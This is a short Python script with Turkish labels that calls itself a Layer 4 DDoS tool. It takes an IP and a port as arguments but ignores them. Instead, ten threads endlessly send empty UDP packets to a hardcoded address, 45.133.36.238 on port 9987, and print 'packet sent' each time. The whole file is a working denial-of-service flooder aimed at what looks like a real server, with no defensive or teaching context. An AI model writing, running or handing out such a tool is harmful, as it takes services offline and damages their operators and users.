import socket
import threading
import argparse

parser = argparse.ArgumentParser(prog="ddos", description="Layer4 ddos gerçekleştirmek için gerekli bilgiler", epilog="-i server ip -p server port")
parser.add_argument("-i", "--ip", required=True, type=str)
parser.add_argument("-p", "--port", required=True, type=int)
args = parser.parse_args()

def ddos_thread():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"", ("45.133.36.238", 9987))
        print("Paket gönderildi")

for _ in range(10):  # 10 thread ile çalıştırılacak
    thread = threading.Thread(target=ddos_thread)
    thread.start()
